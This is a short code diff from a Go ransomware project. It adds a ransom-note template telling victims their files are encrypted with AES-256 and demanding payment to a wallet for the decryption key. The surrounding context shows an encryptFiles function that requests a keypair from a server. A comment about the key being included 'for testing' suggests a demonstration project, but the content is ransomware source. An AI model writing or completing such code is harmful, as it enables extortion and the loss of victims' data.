@@ -12,6 +12,28 @@ import (
 	"github.com/mauri870/ransomware/utils"
 )
 
+var (
+	EncMessage = `
+	YOUR FILES HAVE BEEN ENCRYPTED USING A STRONG 
+	AES-256 ALGORITHM.
+
+	YOUR IDENTIFICATION IS %s
+
+	PLEASE SEND %s TO THE FOLLOWING WALLET 
+
+			      %s
+
+	TO RECOVER THE KEY NECESSARY TO DECRYPT YOUR
+	FILES
+
+	# The enc key is inserted for testing
+	# ENCRYPTION KEY: %s
+
+	AFTER RECOVER YOUR KEY, RUN THE FOLLOWING:
+	%s decrypt yourkeyhere
+	`
+)
+
 func encryptFiles() {
 	res, err := client.CallServer("api/generatekeypair")
 	if err != nil {
